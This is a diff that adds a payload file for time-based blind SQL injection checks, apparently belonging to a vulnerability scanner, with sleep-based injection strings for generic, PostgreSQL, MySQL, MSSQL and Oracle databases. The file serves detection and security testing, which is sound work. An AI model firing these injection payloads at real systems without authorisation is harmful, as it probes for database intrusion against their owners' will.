@@ -1,0 +1,23 @@
+# Payloads for Time-Based Blind SQL Injection.
+# The number at the end represents the sleep duration in seconds.
+# The check will look for a response delay close to this number.
+
+# Generic
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+) AND SLEEP(5)--
+')) AND SLEEP(5)--
+
+# PostgreSQL
+'; SELECT pg_sleep(5)--
+' || pg_sleep(5)--
+
+# MySQL
+' AND BENCHMARK(5000000,MD5(1))--
+" AND BENCHMARK(5000000,MD5(1))--
+
+# MSSQL
+'; WAITFOR DELAY '0:0:5'--
+
+# Oracle
+' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL)--
